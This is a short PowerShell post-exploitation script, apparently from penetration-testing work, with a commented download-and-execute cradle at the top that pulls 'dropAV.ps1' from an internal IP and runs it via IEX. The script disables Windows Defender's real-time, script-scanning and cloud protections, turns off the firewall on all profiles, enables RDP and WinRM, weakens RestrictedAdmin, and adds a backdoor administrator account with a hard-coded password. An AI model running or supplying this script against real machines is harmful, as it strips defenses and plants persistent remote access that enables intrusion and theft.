# (New-Object System.Net.WebClient).DownloadString("http://192.168.XXX.XXX/dropAV.ps1") | IEX
# Add user, enable RDP, winrm, dropsAV

# Disable Windows Defender Real-Time Monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable various Windows Defender protection features
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisablePrivacyMode $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisableScriptScanning $true

# Disable Cloud-delivered Protection
Set-MpPreference -MAPSReporting Disabled

# Disable Automatic Sample Submission
Set-MpPreference -SubmitSamplesConsent NeverSend

#Disable Real-time Protection
Set-MpPreference -DisableAutoExclusions $true

#Configure Quarantine Behavior
Set-MpPreference -PUAProtection 0


New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin  -Value 0


reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Add a user
net user hector Password123 /add
net localgroup "administrators" hector /add
net localgroup "Remote Desktop Users" administrator /add

# Start RDP
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# Start winRM (service, listener, firewalls)
Enable-PSRemoting -SkipNetworkProfileCheck -Force

# Ensure the service is set to start automatically
Set-Service -Name "WinRM" -StartupType Automatic

# Disable Windows Firewall for all profiles
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False


# Function to check the status of Windows Defender settings
function Check-DefenderStatus {
    Get-MpPreference
}

# Call the function to output the current status of Defender settings
Check-DefenderStatus

# Reminder message
Write-Host "All security settings have been disabled. Ensure to re-enable after testing." -ForegroundColor Red
